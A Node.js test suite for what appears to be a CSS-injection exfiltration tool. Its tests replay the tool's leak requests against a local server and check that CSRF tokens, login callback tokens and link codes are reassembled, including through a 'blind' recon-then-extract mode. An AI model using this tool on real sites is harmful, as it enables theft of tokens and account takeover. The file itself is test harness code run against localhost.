'use strict';

// Drives the real HTTP endpoints: configure, replay the requests the payload
// would trigger (in random order), then ask for the token.

process.env.FRAG_SETTLE_MS = '100';

const test = require('node:test');
const assert = require('node:assert/strict');

const { app, PRESETS } = require('../server');
const { generateCSS } = require('../public/payload');
const { SEED, rng, leak, parsePayload } = require('./helpers');

const SETTLE_MS = Number(process.env.FRAG_SETTLE_MS);
const sleep = ms => new Promise(r => setTimeout(r, ms));

let server;
let base;
const realLog = console.log;

test.before(async () => {
  console.log = () => {}; // the server is chatty
  server = app.listen(0);
  await new Promise(r => server.once('listening', r));
  base = `http://127.0.0.1:${server.address().port}`;
});

test.after(() => {
  console.log = realLog;
  server.close();
});

async function configure(user) {
  const res = await fetch(base + '/api/config', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(user),
  });
  const config = await res.json();
  return parsePayload(generateCSS(config, base));
}

const send = ({ t, c }) => fetch(`${base}/${t === 'm' ? '' : t + '/'}${c}`).then(r => r.arrayBuffer());
const token = () => fetch(base + '/api/token').then(r => r.json());

async function extract(rules, value, order, { gapMs = 0, settle = true } = {}) {
  const { requests } = leak(rules, value);
  for (const req of order(requests)) {
    await send(req);
    if (gapMs) await sleep(gapMs);
  }
  const early = await token();
  if (!settle) return { early };
  await sleep(SETTLE_MS + 50);
  return { early, final: await token() };
}

const listed = (result, secret) => (result.candidates || [result.token]).includes(secret);

test('anchor with random hex junk, start first', async () => {
  const r = rng(SEED + 10);
  for (const [length, windowSize] of [[8, 3], [17, 4], [32, 3], [40, 4]]) {
    const rules = await configure({ ...PRESETS.anchor, tokenLength: length, windowSize });
    const secret = r.hex(length);
    const value = 'https://example.com/m/callback/email?token=' + secret +
      '&operation=login&state=medium&rememberMe=false&x=' + r.hex(r.int(4, 40));
    const { early, final } = await extract(rules, value, reqs => [
      reqs.find(q => q.t === 's'),
      ...r.shuffle(reqs.filter(q => q.t !== 's')),
    ]);

    assert.equal(early.status, 'partial', 'must not stitch while requests are still arriving');
    assert.equal(final.status, 'ok', JSON.stringify(final));
    assert.ok((final.candidates || [final.token]).includes(secret), `${secret}: ${JSON.stringify(final)}`);
  }
});

test('hidden input, requests overtaking the start are kept', async () => {
  const r = rng(SEED + 11);
  for (const length of [12, 24, 40]) {
    const rules = await configure({ ...PRESETS.hidden, tokenLength: length });
    const secret = r.hex(length);
    const { final } = await extract(rules, secret, reqs => {
      const shuffled = r.shuffle(reqs.filter(q => q.t !== 's'));
      const half = shuffled.length >> 1;
      // Half the burst (including possibly the end) arrives before the start.
      return [...shuffled.slice(0, half), reqs.find(q => q.t === 's'), ...shuffled.slice(half)];
    });

    assert.equal(final.status, 'ok', JSON.stringify(final));
    assert.ok((final.candidates || [final.token]).includes(secret), `${secret}: ${JSON.stringify(final)}`);
  }
});

test('a later extraction does not inherit chunks from an earlier one', async () => {
  const r = rng(SEED + 12);
  const rules = await configure({ ...PRESETS.hidden, tokenLength: 40, windowSize: 4 });
  const first = r.hex(40);
  const second = r.hex(40);
  await extract(rules, first, reqs => reqs);
  const { final } = await extract(rules, second, reqs => reqs);
  // With 4-char windows a clean extraction is almost always unique, so any
  // leftover windows from the first token would show up as a wrong answer.
  assert.ok(listed(final, second), JSON.stringify(final));
});

test('back-to-back extractions with no quiet gap are kept apart', async () => {
  const r = rng(SEED + 13);
  const rules = await configure({ ...PRESETS.hidden, tokenLength: 40, windowSize: 4 });
  const first = r.hex(40);
  const second = r.hex(40);
  const startFirst = reqs => [reqs.find(q => q.t === 's'), ...r.shuffle(reqs.filter(q => q.t !== 's'))];
  await extract(rules, first, startFirst, { settle: false });
  const { early, final } = await extract(rules, second, startFirst);
  // Mid-burst, the server should hold exactly the second burst's windows.
  const windows = leak(rules, second).requests.filter(q => q.t === 'm').length;
  assert.equal(early.chunks, windows, 'chunks from the first burst leaked into the second');
  assert.ok(listed(final, second), JSON.stringify(final));
});

test('a burst longer than the settle time keeps chunks sent before a late start', async () => {
  const r = rng(SEED + 14);
  const rules = await configure({ ...PRESETS.hidden, tokenLength: 40, windowSize: 4 });
  const secret = r.hex(40);
  // Requests trickle in with gaps shorter than SETTLE_MS, but the whole burst
  // lasts several times longer, and the start arrives last.
  const { final } = await extract(rules, secret, reqs => [
    ...r.shuffle(reqs.filter(q => q.t !== 's')),
    reqs.find(q => q.t === 's'),
  ], { gapMs: SETTLE_MS / 4 });
  assert.equal(final.status, 'ok', JSON.stringify(final));
  assert.ok(listed(final, secret), JSON.stringify(final));
});

test('leak routes only accept the lengths the payload uses', async () => {
  for (const path of ['/abcde', '/ab', '/s/abc', '/e/a', '/s/zz']) {
    const res = await fetch(base + path);
    assert.equal(res.status, 404, path);
  }
  for (const path of ['/', '/payload.js']) {
    const res = await fetch(base + path);
    assert.equal(res.status, 200, path);
  }
});

// --- blind mode ----------------------------------------------------------------

const B = require('../public/blind');
const { el, page, requests } = require('./blind-helpers');

const getJson = path => fetch(base + path).then(r => r.json());
const postJson = (path, body) => fetch(base + path, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(body),
});
const hit = path => fetch(`${base}/${path}`).then(r => r.arrayBuffer());

test('blind: recon then extract over HTTP, with unknown lengths', async () => {
  await getJson('/api/blind/reset');
  const r = rng(SEED + 20);
  const csrf = r.hex(40);
  const code = r.hex(32);
  const form = el('form', {});
  const doc = page([
    form,
    el('input', { type: 'hidden', name: 'csrf', value: csrf }, { form }),
    el('input', { type: 'hidden', name: 'lang', value: 'en' }, { form }),
    el('a', { href: `/verify?code=${code}&next=home` }),
  ]);

  for (const p of r.shuffle([...requests(doc, B.reconPayload())])) await hit(p);
  assert.equal((await getJson('/api/recon')).status, 'partial', 'must wait for the burst to end');
  await sleep(SETTLE_MS + 50);
  const found = await getJson('/api/recon');
  assert.equal(found.status, 'ok');
  assert.deepEqual(found.fields, [
    { kind: 'input', name: 'csrf', host: 'form', hex: true },
    { kind: 'a', name: 'code', host: 'self', hex: null },
  ]);
  assert.equal(found.unlistedInputs, true);

  const res = await postJson('/api/blind', { fields: found.fields.map(f => ({ ...f, windowSize: 4 })) });
  assert.equal(res.status, 200);
  const { fields } = await res.json();
  assert.equal(fields.length, 2);
  assert.equal(fields[1].id, fields[0].id + 1);

  for (const p of r.shuffle([...requests(doc, B.extractPayload(fields))])) await hit(p);
  assert.equal((await getJson('/api/blind/tokens')).status, 'partial');
  await sleep(SETTLE_MS + 50);
  const tokens = await getJson('/api/blind/tokens');
  assert.equal(tokens.status, 'ok');
  assert.equal(tokens.results[0].token, csrf, JSON.stringify(tokens.results[0]));
  assert.ok(listed(tokens.results[1], code), JSON.stringify(tokens.results[1]));
});

test('blind: each configuration gets fresh field ids, so payload URLs never repeat', async () => {
  const configure = async () => (await (await postJson('/api/blind', {
    fields: [{ kind: 'meta', name: 'csrf-token', host: 'self', windowSize: 3 }],
  })).json()).fields[0].id;
  const first = await configure();
  const second = await configure();
  assert.notEqual(first, second);
  assert.equal((await fetch(`${base}/b/${first}/abc`)).status, 404, 'old ids stop recording');
});

test('blind: only wordlist fields and known routes are accepted', async () => {
  for (const fields of [
    [],
    [{ kind: 'input', name: 'not-in-wordlist', host: 'form' }],
    [{ kind: 'meta', name: 'csrf-token', host: 'form' }],
    [{ kind: 'script', name: 'csrf', host: 'self' }],
  ]) {
    const res = await postJson('/api/blind', { fields });
    assert.equal(res.status, 400, JSON.stringify(fields));
  }
  const res = await postJson('/api/blind', { fields: [{ kind: 'input', name: 'csrf', host: 'form', windowSize: 3 }] });
  const id = (await res.json()).fields[0].id;
  for (const path of ['/r/i/not-in-wordlist', '/r/zz/csrf', `/b/${id + 1}/abc`, `/b/${id}/abcd`, `/b/${id}/s/abc`, `/b/${id}/x/ab`]) {
    const res = await fetch(base + path);
    assert.equal(res.status, 404, path);
  }
  for (const path of ['/r/i/csrf', `/b/${id}/abc`, `/b/${id}/s/ab`, '/blind.js']) {
    const res = await fetch(base + path);
    assert.equal(res.status, 200, path);
  }
});
